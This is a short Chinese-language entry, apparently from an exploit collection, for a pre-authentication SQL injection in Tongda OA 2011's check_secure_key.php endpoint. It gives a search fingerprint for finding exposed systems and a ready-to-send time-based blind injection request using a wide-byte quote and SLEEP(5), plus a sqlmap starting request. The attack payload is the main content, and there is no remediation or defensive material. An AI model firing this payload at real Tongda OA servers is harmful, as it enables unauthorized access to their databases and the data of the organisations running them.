# 通达OAcheck_secure_key存在前台SQL注入漏洞

- **系统**：通达OA　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app.name="通达 OA"`
- **请求**：`GET /ispirit/check_secure_key.php?USERNAME=%df'+AND+%28SELECT+6211+FROM+%28SELECT%28SLEEP%285%29%29%29vMBT%29--+NpkQ HTTP/1.1`
- **关键头**：`Host: {hostname}`

**请求体 / payload**
```

sqlmap
GET /ispirit/check_secure_key.php?USERNAME=%df%27%20  HTTP/1.1
Host: {hostname}
```

**其他**
- 通达OA check\_secure\_key存在前台SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 通达OA2011